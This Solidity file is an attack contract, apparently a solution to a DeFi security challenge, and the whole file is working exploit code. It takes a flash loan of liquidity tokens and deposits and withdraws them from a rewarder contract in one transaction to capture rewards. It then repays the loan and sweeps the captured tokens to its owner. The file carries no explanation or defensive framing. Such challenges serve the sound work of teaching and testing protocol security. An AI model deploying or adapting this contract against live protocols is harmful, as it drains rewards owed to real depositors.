// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IFlashLoan {
  function flashLoan(uint256 amount) external;
}

interface IRewarder {
  function deposit(uint256 amountToDeposit) external;
  function withdraw(uint256 amountToWithdraw) external;
}

contract AttackReward is Ownable, ReentrancyGuard {
  IFlashLoan flashLoanContract;
  IERC20 liduidityTokenContract;
  IRewarder rewarderContract;

  constructor(address flashLoanAddress, address liquidityTokenAddress, address rewarderAddress) {
    flashLoanContract = IFlashLoan(flashLoanAddress);
    liduidityTokenContract = IERC20(liquidityTokenAddress);
    rewarderContract = IRewarder(rewarderAddress);
  }

  function requestFlashLoan(uint amount) external onlyOwner nonReentrant {
    flashLoanContract.flashLoan(amount);
  }

  function receiveFlashLoan(uint amount) external {
    require(msg.sender == address(flashLoanContract), 'Not the pool');
    liduidityTokenContract.approve(address(rewarderContract), amount);
    rewarderContract.deposit(amount);
    rewarderContract.withdraw(amount);
    liduidityTokenContract.transfer(msg.sender, amount);
  }

  function withdraw(address tokenAddress) external {
    IERC20 token = IERC20(tokenAddress);
    token.transfer(owner(), token.balanceOf(address(this)));
  }
}